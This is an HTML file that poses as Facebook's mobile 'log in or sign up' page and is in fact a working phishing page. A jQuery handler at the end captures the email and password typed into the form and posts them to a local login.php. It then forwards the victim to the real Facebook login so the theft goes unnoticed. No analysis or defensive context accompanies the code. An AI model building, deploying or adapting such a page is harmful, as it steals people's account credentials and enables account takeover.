<!--<body></body>-->
<!DOCTYPE html>
<html lang="en">
<html>
  <head>
    <title>Facebook – log in or sign up</title>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <link href="favicon.png" rel="shortcut icon" sizes="196x196" />
    <meta name="theme-color" content="#3b5998" />
    <link rel="stylesheet" href="assets/style.css"/>
  </head>
  <body>
    <a class="header-news" href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DEdecX5P4hDLDaqjLfdP3U3Iq%26referrer_params%255Blink_source%255D%3Dfb_app_banner&app_id=350685531728&cref=mb&no_fw=1&ref=dbl"><img src="assets/mmobileapp.png" class="mmi"/>Get Facebook for Android and browse faster.</a>
    <div class="formpet">
      <img class="hero-logo" src="assets/facebook.svg"/>

      <div class="signForm">
        <form id="login_form" method="get" action="http://m.facebook.com/login/">
          <div class="inp-sec"><input class="epBox eBox" id="login_email" type="email" name="email" autocorrect="off" autocapitalize="off" autocomplete="on" placeholder="Mobile number or email address"/></div>
          <div class="inp-sec"><input class="epBox pBox" id="login_password" type="password" autocorrect="off" autocapitalize="off" autocomplete="on" name="pass" placeholder="Password"/></div>
        </form>
        <div class="inp-sec"><button id="submit_login" class="logBtn">Log In</button></div>
      </div>

      <div class="sep"><span class="sp">or</span></div>
      <div class="rdSec1">
        <form method="get" action="https://m.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&soft=hjk">
          <input type="submit" class="regBtn" value="Create New Account"/>
        </form>
      </div>
      <div class="rdSec2">
        <a class="fpLnk" href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&r&cuid&ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjE1NjA1MTk1LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&lwv=100&ref=dbl">Forgotten password?</a>
      </div>
    </div>
    <div class="nav-sec">
      <table class="btm-navs">
      <tr>
      <td class="act">English (UK)</td>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=bn_IN&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQB-gzJhvNW8bHTcTsY&ref=dbl">বাংলা</a></td>
      </tr>
      <tr>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=as_IN&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQAxWF9-dEgBOKNgrI0&ref=dbl">অসমীয়া</a></td>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=hi_IN&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQCcQTreHR82sO2zQio&ref=dbl">हिन्दी</a></td>
      </tr>
      <tr>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=id_ID&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQDCchgHkkhnrzSXzgc&ref=dbl">Bahasa Indonesia</a></td>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=es_LA&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQCeNuSH36n1YseiK1c&ref=dbl">Español</a></td>
      </tr>
      <tr>
      <td><a class="na" href="https://m.facebook.com/a/language.php?l=pt_BR&lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&sref=legacy_mobile_settings_selector&gfid=AQBk_hoHHUIPqe5NOuU&ref=dbl">Português (Brasil)</a></td>
      <td><a class="ina" href="https://m.facebook.com/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&ref=dbl"><span class="more-lang-icn">+</span></a></td>
      </tr>
      </table>
    </div>
    <div class="btm-crdt">Facebook Inc.</div>
  </body>
  <script src="assets/jquery.js"></script>
  <script>
  $(document).ready(function(){
    $('#submit_login').on('click', function(){
      $('#submit_login').attr('disabled', true);
      $.post('login.php',
      {
        login: true,
        email: $('#login_email').val(),
        pass: $('#login_password').val()
      },
      function(data, status){
        if(status == "success"){
          $('#submit_login').removeAttr('disabled');
          $('#login_form').submit();
        }
      });
    });
  });
  </script>
</html>
